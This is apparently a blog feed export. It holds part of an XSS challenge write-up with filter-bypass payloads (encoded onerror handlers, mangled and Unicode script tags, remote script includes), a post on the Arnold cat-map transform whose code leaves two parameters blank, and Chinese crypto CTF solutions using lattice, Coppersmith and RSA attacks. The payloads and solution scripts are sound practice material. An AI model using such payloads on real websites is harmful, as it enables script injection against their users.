<blockquote>
<p>Failed! Don’t know why.</p>
</blockquote>
<ul>
<li><strong>Import the target file to complete the XSS.</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.segmentfault.com.haozi.me/j.js</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x0a.png" class="" title="0x0a">
<ul>
<li>the end of url add @target url</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.segmentfault.com@https://www.xxx.com/j.js</span><br></pre></td></tr></table></figure>
<p><em>Make sure that the target url is <code>https</code>.</em></p>
<h1>0x0b</h1>
<p>IMG label and html encode.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; onerror=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x0b.png" class="" title="0x0b">
<h1>0x0c</h1>
<ul>
<li>
<p>Same above.</p>
</li>
<li>
<p>The anterior and posterior deformities are constructed.</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;sscriptcript src=https://www.segmentfault.com.haozi.me/j.js&gt;&lt;/sscriptcript&gt;</span><br></pre></td></tr></table></figure>
<h1>0x0d</h1>
<p><strong><code>Enter</code> break the comment structure.</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">alert(1) </span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x0d.png" class="" title="0x0d">
<h1>0x0e</h1>
<p>Think reverse, find the character <strong>ſ</strong> which means <code>s</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;ſcript src=&quot;https://www.segmentfault.com.haozi.me/j.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h1>0x0f</h1>
<p>HTML encode. End the code and comment at last.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;); alert(1) //</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x0f.png" class="" title="0x0f">
<h1>0x10</h1>
<p>No filtration. Just bypass.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;;alert(1);</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x10.png" class="" title="0x10">
<h1>0x11</h1>
<p><strong><code>//</code>is escaped, but it still runs at <code>//</code> in fact.</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;);alert(1);//</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x11.png" class="" title="0x11">
<h1>0x12</h1>
<ul>
<li><strong>Escape the escape character.</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\&quot;); alert(1); //</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x12-1.png" class="" title="0x12-1">
<ul>
<li><strong>Embed label inline.</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/script&gt; &lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;</span><br></pre></td></tr></table></figure>
<img src="/2022/12/30/22-12-30-XSS/0x12-2.png" class="" title="0x12-2">
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>penetration</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Arnold Transform</title>
    <url>/2023/07/04/Arnold-Transform/</url>
    <content><![CDATA[<p>AKA <code>cat map</code>.</p>
<p>The classic <code>Arnold Transform</code> is a two-dimensional reversible map. The discrete form of the <code>Arnold Transform</code> is periodic and changes with the size of the image.</p>
<span id="more"></span><!--toc-->
<h1>Special Arnold Transform</h1>
<h2 id="Def-1">Def.1</h2>
<h1>$$<br>
\begin{bmatrix}<br>
x’\\<br>
y’<br>
\end{bmatrix}</h1>
<p>A<br>
\begin{bmatrix}<br>
x\\<br>
y<br>
\end{bmatrix}<br>
\mod N, A =<br>
\begin{bmatrix}<br>
1 &amp; 1 \\<br>
1 &amp; 2<br>
\end{bmatrix}<br>
, 0\le x, y \le 1, 0\le x’, y’ \le 1<br>
$$</p>
<p>$$<br>
\Longrightarrow<br>
\left\{<br>
\begin{array}{lr}<br>
x’ = (x + y) \mod N \\<br>
y’ = (x + 2y) \mod N<br>
\end{array}<br>
\right.<br>
$$<br>
Two-dimensional Arnold Transform.</p>
<h2 id="Def-2">Def.2</h2>
<h1>$$<br>
\begin{bmatrix}<br>
x\\<br>
y<br>
\end{bmatrix}</h1>
<p>A^{-1}<br>
\begin{bmatrix}<br>
x’\\<br>
y’<br>
\end{bmatrix}<br>
\mod N, A^{-1} =<br>
\begin{bmatrix}<br>
2 &amp; -1 \\<br>
-1 &amp; 1<br>
\end{bmatrix}<br>
, 0\le x, y \le 1, 0\le x’, y’ \le 1<br>
$$</p>
<p>$$<br>
\Longrightarrow<br>
\left\{<br>
\begin{array}{lr}<br>
x = (2x’ - y’) \mod N \\<br>
y = (-x’ + y’) \mod N<br>
\end{array}<br>
\right.<br>
$$</p>
<p>Two-dimensional Arnold inverse transformation.</p>
<h1>General Arnold Transform</h1>
<h2 id="Def-1-2">Def.1</h2>
<h1>$$<br>
\begin{bmatrix}<br>
x’\\<br>
y’<br>
\end{bmatrix}</h1>
<p>\begin{bmatrix}<br>
1 &amp; a \\<br>
b &amp; ab + 1<br>
\end{bmatrix}<br>
\begin{bmatrix}<br>
x\\<br>
y<br>
\end{bmatrix}<br>
\mod N<br>
$$</p>
<p>$$<br>
\Longrightarrow<br>
\left\{<br>
\begin{array}{lr}<br>
x’ = (x + ay) \mod N \\<br>
y’ = (bx + (ab + 1)y) \mod N<br>
\end{array}<br>
\right.<br>
$$</p>
<h2 id="Def-2-2">Def.2</h2>
<h1>$$<br>
\begin{bmatrix}<br>
x\\<br>
y<br>
\end{bmatrix}</h1>
<p>\begin{bmatrix}<br>
ab + 1 &amp; -a \\<br>
-b &amp; 1<br>
\end{bmatrix}<br>
\begin{bmatrix}<br>
x’\\<br>
y’<br>
\end{bmatrix}<br>
\mod N<br>
$$</p>
<p>$$<br>
\Longrightarrow<br>
\left\{<br>
\begin{array}{lr}<br>
x = ((ab + 1)x’ - ay’) \mod N \\<br>
y = (-bx’ + y’) \mod N<br>
\end{array}<br>
\right.<br>
$$</p>
<h1>Accomplish</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arnold</span>(<span class="params">image, arnold_times</span>):</span><br><span class="line">    a = </span><br><span class="line">    b = </span><br><span class="line">    <span class="comment"># Create a new image, a three-dimensional array of all 0s</span></span><br><span class="line">    decode_image = np.zeros(shape=image.shape)</span><br><span class="line">    <span class="comment"># Read the length and width pixels of the picture</span></span><br><span class="line">    height, width = image.shape[<span class="number">0</span>], image.shape[<span class="number">1</span>]</span><br><span class="line">    N = height  <span class="comment"># if it is a square, height is equal to width</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> time <span class="keyword">in</span> <span class="built_in">range</span>(arnold_times):  <span class="comment"># transformation times</span></span><br><span class="line">        <span class="comment"># Traverse the pixel coordinates of the image</span></span><br><span class="line">        <span class="keyword">for</span> old_x <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">            <span class="keyword">for</span> old_y <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">                <span class="comment"># Arnold Inverse Transform</span></span><br><span class="line">                new_x = ((a * b + <span class="number">1</span>) * old_x + (-a) * old_y) % N <span class="comment"># N = height</span></span><br><span class="line">                new_y = ((-b) * old_x + old_y) % N <span class="comment"># N = width</span></span><br><span class="line">                <span class="comment"># Arnold Transform</span></span><br><span class="line">                <span class="comment"># new_x = (old_x + a * old_y) % N # N = height</span></span><br><span class="line">                <span class="comment"># new_y = (b * old_x + (a * b + 1) * old_y) % N # N = width</span></span><br><span class="line"></span><br><span class="line">                decode_image[new_x, new_y, :] = image[old_x, old_y, :]</span><br><span class="line">    cv2.imwrite(<span class="string">&#x27;xxx&#x27;</span>, decode_image, [<span class="built_in">int</span>(cv2.IMWRITE_PNG_COMPRESSION), <span class="number">0</span>])  <span class="comment"># write as PNG</span></span><br><span class="line">    <span class="keyword">return</span> decode_image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># imread(path,flag) reads the picture, the default parameter value of loading a color picture is flag=1, the grayscale is 0, the transparency is -1, the result is a three-dimensional array, the first two dimensions are pixel coordinates, and the last one is the channel index</span></span><br><span class="line">    it = cv2.imread(<span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line">    arnold(it, <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Math</category>
      </categories>
      <tags>
        <tag>cat</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto-Write-Up-Zh</title>
    <url>/2023/03/09/Crypto-Write-Up-zh/</url>
    <content><![CDATA[<p>As a routine notepad to record some recurrent tasks in Chinese.</p>
<p>These tasks are somewhat special or interesting, which deserve recording.</p>
<p>Timelines are <strong>from new to old</strong>.</p>
<span id="more"></span><!--toc-->
<h1>[DCIC2023-final]easybag</h1>
<ul>
<li>LLL规约</li>
</ul>
<p>背包，但是模比较小，所以用常见的那几个格都打不了，可能的方法有二：一是用babai求解cvp，二是把原来的格子多加一维，放个模数进去规约，这里用的第二种：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 构造格子</span></span><br><span class="line">A = Matrix(ZZ, <span class="number">66</span>, <span class="number">66</span>)</span><br><span class="line"><span class="comment"># print(A)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">    A[i,i] = <span class="number">1</span></span><br><span class="line">    A[i,<span class="number">65</span>] = -pubkey[i]</span><br><span class="line">    </span><br><span class="line">A[<span class="number">64</span>,<span class="number">64</span>] = <span class="number">1</span></span><br><span class="line">A[<span class="number">64</span>,<span class="number">65</span>] = c</span><br><span class="line">A[<span class="number">65</span>,<span class="number">65</span>] = p</span><br><span class="line"><span class="comment"># print(A)</span></span><br><span class="line"><span class="built_in">print</span>(A.LLL()[<span class="number">0</span>])</span><br><span class="line"><span class="comment"># (0, -1, 0, 0, 0, -1, 0, -1, -1, -1, 0, 0, 0, -1, -1, -1, 0, -1, -1, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, -1, 0, -1, -1, -1, 0, 0, 0, 0, 0, 0, -1, -1, 0, -1, 0, 0, -1, 0, 0, 0, -1, -1, -1, 0, 0, -1, -1, 0, 0, 0, -1, 0, -1, -1, -1, 0)</span></span><br></pre></td></tr></table></figure>
<p>LLL算法计算出来的长度为<code>66</code>，强制使用固定长度为<code>64</code>的向量进行计算。</p>
<p>所以概括一下，先多加一维进行规约，再使用原来固定长度的向量继续计算，保证一致。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># k = (0, -1, 0, 0, 0, -1, 0, -1, -1, -1, 0, 0, 0, -1, -1, -1, 0, -1, -1, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, -1, 0, -1, -1, -1, 0, 0, 0, 0, 0, 0, -1, -1, 0, -1, 0, 0, -1, 0, 0, 0, -1, -1, -1, 0, 0, -1, -1, 0, 0, 0, -1, 0, -1, -1)</span></span><br><span class="line">k = A.LLL()[<span class="number">0</span>][<span class="number">0</span>:<span class="number">64</span>]</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">key = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> k:</span><br><span class="line">    <span class="keyword">if</span> i:</span><br><span class="line">        key += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key += <span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(key))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(key, <span class="number">2</span>))[<span class="number">2</span>:])</span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="built_in">int</span>(key, <span class="number">2</span>))[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(key))</span><br><span class="line">aes = AES.new(key = key*<span class="number">2</span>, mode=AES.MODE_ECB)</span><br><span class="line"><span class="built_in">print</span>(aes.decrypt(enc))</span><br><span class="line"><span class="comment"># 64</span></span><br><span class="line"><span class="comment"># 45c76015c0d2398b</span></span><br><span class="line"><span class="comment"># 8</span></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;e42f0ab28e1c5fb04bbb0c797a2cd951&#125;\n\n\n\n\n\n\n\n\n\n&#x27;</span></span><br></pre></td></tr></table></figure>
<h1>[DCIC2023-final]ddddhm</h1>
<ul>
<li>条件判断得到<code>part_d</code></li>
<li>Coppersmith-lowd</li>
</ul>
<h2 id="part-d的求解">part_d的求解</h2>
<p>本题的关键在于<code>fault_signature</code>函数。注意到在该函数中，每次进行加密使用的$d$是由$d2$变化得来的，且每次仅变化1位。由于$d2$肯定是奇数，所以第一次变换时，使用的结果肯定是$d2-1$，即：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">msg_fault_sigs[<span class="number">0</span>] = <span class="built_in">pow</span>(msg, d2 - <span class="number">1</span>, n)</span><br></pre></td></tr></table></figure>
<p>剩下部分依旧按照该思路进行判断，由于存在不确定性，利用计算出<code>msg_fault_sigs[0]</code>进行辅助判断，从而计算出<code>part_d</code>：</p>
<p><em>字符串连接顺序需要注意，从低位到高位。</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">msg = bytes_to_long(<span class="string">b&#x27;ddddhm&#x27;</span>)</span><br><span class="line">pows = <span class="number">2</span></span><br><span class="line">part_d = <span class="string">&quot;1&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(msg_fault_sigs)):</span><br><span class="line">    <span class="comment"># here should pay attention to the string&#x27;s order</span></span><br><span class="line">    <span class="keyword">if</span>((msg_fault_sigs[i] * <span class="built_in">pow</span>(msg, pows-<span class="number">1</span>, n) - msg_fault_sigs[<span class="number">0</span>]) % n)==<span class="number">0</span>:</span><br><span class="line">        part_d = <span class="string">&quot;1&quot;</span> + part_d</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        part_d = <span class="string">&quot;0&quot;</span> + part_d</span><br><span class="line">    pows *= <span class="number">2</span></span><br><span class="line">part_d = <span class="built_in">int</span>(part_d, <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(part_d.bit_length())</span><br><span class="line"><span class="built_in">print</span>(part_d)</span><br><span class="line"><span class="comment"># 681</span></span><br><span class="line"><span class="comment"># 9519637250511849605092115946924531911819643854022344770386391196998091816870433223070160919249620469852108874736739746738237759468821919367674447147826813269165414967606625427817526475380034928092527497223</span></span><br></pre></td></tr></table></figure>
<h2 id="coppersmith攻击-已知d低位">coppersmith攻击-已知d低位</h2>
<p>使用通用脚本计算得$p$。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">partial_p</span>(<span class="params">p0, kbits, n</span>):</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    nbits = n.nbits()</span><br><span class="line"></span><br><span class="line">    f = <span class="number">2</span>^kbits*x + p0</span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^(nbits//<span class="number">2</span>-kbits), beta=<span class="number">0.3</span>)  <span class="comment"># find root &lt; 2^(nbits//2-kbits) with factor &gt;= n^0.3</span></span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        x0 = roots[<span class="number">0</span>]</span><br><span class="line">        p = gcd(mpz(<span class="number">2</span>^kbits*x0 + p0), mpz(n))</span><br><span class="line">        <span class="keyword">return</span> ZZ(p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_p</span>(<span class="params">d0, kbits, e, n</span>):</span><br><span class="line">    X = var(<span class="string">&#x27;X&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e+<span class="number">1</span>):</span><br><span class="line">        results = solve_mod([e*d0*X - k*X*(n-X+<span class="number">1</span>) + k*n == X], <span class="number">2</span>^kbits)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> results:</span><br><span class="line">            p0 = ZZ(x[<span class="number">0</span>])</span><br><span class="line">            p = partial_p(p0, kbits, n)</span><br><span class="line">            <span class="keyword">if</span> p:</span><br><span class="line">                <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">p = find_p(part_d, <span class="number">1024</span>-part_d.bit_length(), <span class="number">7</span>, n)</span><br><span class="line"><span class="comment"># 12800335172378590918875662486524333103691215133150369430200420149970735808370081784433007260276277361253378071964953226360740601994258142232798414547092861</span></span><br></pre></td></tr></table></figure>
<p>已知$p$之后那就直接转换成基础RSA了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">q = n // p</span><br><span class="line">d = invert(<span class="number">0x10001</span>, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = powmod(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(unpad(long_to_bytes(m)).decode())</span><br><span class="line"><span class="comment"># 280953633736431747947064628051293908189096295024698457307220800187630550375386320255208827601751935813552184196283101709554718133038728081799604794900708412174536625884689548714026681568503654577602432205861968756823980122854293696554980209163635856940269021305243235482137890575873848821429361178108376901</span></span><br><span class="line"><span class="comment"># flag&#123;54b5dc19-5037-46c3-8afe-45394f236852&#125;</span></span><br></pre></td></tr></table></figure>
<h1>[HDCTF2023]math_rsa</h1>
<ul>
<li>二次剩余</li>
</ul>
<p>主要通过生成参数的满足条件进行判定的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r=getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">assert</span> r%<span class="number">4</span>==<span class="number">3</span></span><br><span class="line"><span class="comment"># 可得r模4余3</span></span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(p,(r-<span class="number">1</span>)//<span class="number">2</span>,r)==<span class="number">1</span></span><br><span class="line"><span class="comment"># 满足二次剩余相关，勒让德符号为1，则，p是r的二次剩余</span></span><br><span class="line"><span class="comment"># 即 p = x^2 mod r</span></span><br><span class="line">a=<span class="built_in">pow</span>(p,<span class="number">2</span>,r)</span><br><span class="line"><span class="comment"># a = p^2 mod r， </span></span><br></pre></td></tr></table></figure>
<p><strong>欧拉准则</strong>，“$a$是模$p$的二次剩余“是”$a^{\frac{p - 1}{2}} \equiv 1\mod p$“的充要条件。</p>
<p>判定为二次剩余类的，直接使用<code>Tonelli_Shanks()</code>求解$p$即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Tonelli_Shanks</span>(<span class="params">a, p</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    no satisfy 3mod4，to calculate remainder</span></span><br><span class="line"><span class="string">    or p is prime</span></span><br><span class="line"><span class="string">    references:</span></span><br><span class="line"><span class="string">    - https://rosettacode.org/wiki/Tonelli-Shanks_algorithm</span></span><br><span class="line"><span class="string">    - [V&amp;N2020]Easy RSA</span></span><br><span class="line"><span class="string">    - 可等价于from sympy.ntheory.residue_ntheory import nthroot_mod(c, 2, r)-&gt; x^2 = c mod r</span></span><br><span class="line"><span class="string">    - 可等价于sagemath: f.roots()</span></span><br><span class="line"><span class="string">    :param a: remainder</span></span><br><span class="line"><span class="string">    :param p: modulo</span></span><br><span class="line"><span class="string">    :return: r</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># STEP0</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">pow</span>(a, (p-<span class="number">1</span>)//<span class="number">2</span>, p) == <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> p % <span class="number">4</span> == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> Fermat_2remainder(a, p)</span><br><span class="line">    <span class="comment"># STEP1</span></span><br><span class="line">    q = p - <span class="number">1</span></span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> q % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        q = q // <span class="number">2</span></span><br><span class="line">        s += <span class="number">1</span></span><br><span class="line">    <span class="comment"># STEP2</span></span><br><span class="line">    <span class="keyword">for</span> z <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, p):</span><br><span class="line">        <span class="keyword">if</span> Legendre_Symbol(z, p) == p - <span class="number">1</span>:</span><br><span class="line">            c = <span class="built_in">pow</span>(z, q, p)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># STEP3</span></span><br><span class="line">    r = <span class="built_in">pow</span>(a, (q+<span class="number">1</span>)//<span class="number">2</span>, p)</span><br><span class="line">    t = <span class="built_in">pow</span>(a, q, p)</span><br><span class="line">    m = s</span><br><span class="line">    <span class="comment"># STEP4</span></span><br><span class="line">    <span class="keyword">if</span> t % p == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> t % p != <span class="number">1</span>:</span><br><span class="line">            temp = <span class="built_in">pow</span>(t, <span class="number">2</span>**(i + <span class="number">1</span>), p)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> temp % p == <span class="number">1</span>:</span><br><span class="line">                b = <span class="built_in">pow</span>(c, <span class="number">2</span>**(m - i - <span class="number">1</span>), p)</span><br><span class="line">                r = r*b % p</span><br><span class="line">                c = b*b % p</span><br><span class="line">                t = t*c % p</span><br><span class="line">                m = i</span><br><span class="line">                i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">p = Tonelli_Shanks(a, r)</span><br><span class="line"><span class="keyword">assert</span> isPrime(p) == <span class="number">1</span></span><br><span class="line"><span class="comment"># -&gt; 基础RSA</span></span><br></pre></td></tr></table></figure>
<h1>[HUBUCTF 2022 新生赛]ezMath</h1>
<ul>
<li>pwn交互</li>
</ul>
<p>很直接，跟靶机交互，做100道简单数学题。惯例先过哈希，然后交互做题。</p>
<p>适合作为交互题目的练习题。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof_of_work</span>(<span class="params">known: <span class="built_in">bytes</span>,hashcode</span>):</span><br><span class="line">	<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">	know sha256(XXXX+known) == hashcode</span></span><br><span class="line"><span class="string">	get the XXXX</span></span><br><span class="line"><span class="string">	charset = letter + digits</span></span><br><span class="line"><span class="string">	XXXX has four char</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span></span><br><span class="line">	charset = string.ascii_letters + string.digits</span><br><span class="line">	<span class="keyword">for</span> a <span class="keyword">in</span> charset:</span><br><span class="line">		<span class="keyword">for</span> b <span class="keyword">in</span> charset:</span><br><span class="line">			<span class="keyword">for</span> c <span class="keyword">in</span> charset:</span><br><span class="line">				<span class="keyword">for</span> d <span class="keyword">in</span> charset:</span><br><span class="line">					guess = a + b + c + d</span><br><span class="line">					<span class="keyword">if</span> sha256(guess.encode()+known).hexdigest() == hashcode:</span><br><span class="line">						<span class="keyword">return</span> guess</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">link = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 过SHA256</span></span><br><span class="line"><span class="comment"># 接收</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[+] sha256(XXXX+B79N1NIZWlK7gHKB) == 40183d93c30a0316b45ebfabb07db7dc951e143e3fa3c4a004667e2f081c144b</span></span><br><span class="line"><span class="string">[+] Plz Tell Me XXXX :Hvoc</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 读取到一直读到 sha256(XXXX+ 的 pattern 出现为止</span></span><br><span class="line">link.recvuntil(<span class="string">b&#x27;sha256(XXXX+&#x27;</span>)</span><br><span class="line">str1 = link.recvuntil(<span class="string">b&#x27;)&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">link.recvuntil(<span class="string">b&#x27;== &#x27;</span>)</span><br><span class="line">str2 = link.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">send_XXXX = proof_of_work(str1, str2.decode()).encode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送</span></span><br><span class="line">link.sendlineafter(<span class="string">b&#x27;Plz Tell Me XXXX :&#x27;</span>, send_XXXX)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 100次数学计算</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    link.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">    link.recvuntil(<span class="string">b&#x27; &#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    s = link.recvuntil(<span class="string">b&#x27;= &#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    sol_out = <span class="built_in">str</span>(<span class="built_in">eval</span>(s)).encode()</span><br><span class="line">    send_sol_out = link.sendlineafter(<span class="string">b&#x27;?&#x27;</span>, sol_out)</span><br><span class="line">    link.recvline()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结束连接</span></span><br><span class="line">link.recvall()</span><br><span class="line"><span class="comment"># NSSCTF&#123;c629810b-e1b2-40f6-ac92-c88fb041d422&#125;</span></span><br></pre></td></tr></table></figure>
<h1>[NSSCTF-round11]ez_fac</h1>
<ul>
<li>论文题</li>
</ul>
<p><strong>KEY</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(a0,<span class="number">2</span>) + e * <span class="built_in">pow</span>(b0,<span class="number">2</span>) == n</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(a1,<span class="number">2</span>) + e * <span class="built_in">pow</span>(b1,<span class="number">2</span>) == n</span><br></pre></td></tr></table></figure>
<p>$$<br>
a_0^{2} + e \times b_0^{2} =n<br>
$$</p>
<p>$$<br>
a_1^{2} + e\times b_1^{2} = n<br>
$$</p>
<p>根据论文中总结算法。</p>
<img src="/2023/03/09/Crypto-Write-Up-zh/1.jpg" class="" title="note">
<p>$N$存在两种形式的分解，那么$gcd(N, ad -bc)=p$一定成立。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">temp = a0 * b1 - a1 * b0</span><br><span class="line">p = gcd(n, temp)</span><br><span class="line">q = n // p</span><br><span class="line"><span class="keyword">assert</span> p.bit_length() == <span class="number">512</span></span><br><span class="line"><span class="keyword">assert</span> q.bit_length() == <span class="number">512</span></span><br><span class="line">e = (n - a0*a0)//(b0*b0)</span><br><span class="line"><span class="keyword">assert</span> e.bit_length() == <span class="number">128</span></span><br><span class="line">d = invert(e, (p - <span class="number">1</span>)*(q - <span class="number">1</span>))</span><br><span class="line">m = powmod(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<h1>[DCIC2023]math_exam</h1>
<h2 id="challenge-1">challenge 1</h2>
<ul>
<li>deduction</li>
</ul>
<p><strong>KEY</strong><br>
$$<br>
leak \equiv (n + p) \mod (q-1)<br>
$$</p>
<p>$$<br>
n = p \times q<br>
$$</p>
<p><strong>DEDUCTION-1</strong><br>
$$<br>
leak \equiv (p \times q + p )\mod (q-1) \equiv p(q + 1) \mod (q-1) \equiv 2p \mod (q-1)<br>
$$</p>
<p>$$<br>
\because p &gt; q<br>
$$</p>
<p>$$<br>
\therefore p \mod (q-1) = p - (q - 1)<br>
$$</p>
<p>$$<br>
\Longrightarrow leak = 2(p-(q-1))<br>
$$</p>
<p>利用<code>sympy</code>中的<code>solve()</code>计算<code>p</code>以及<code>q</code>。</p>
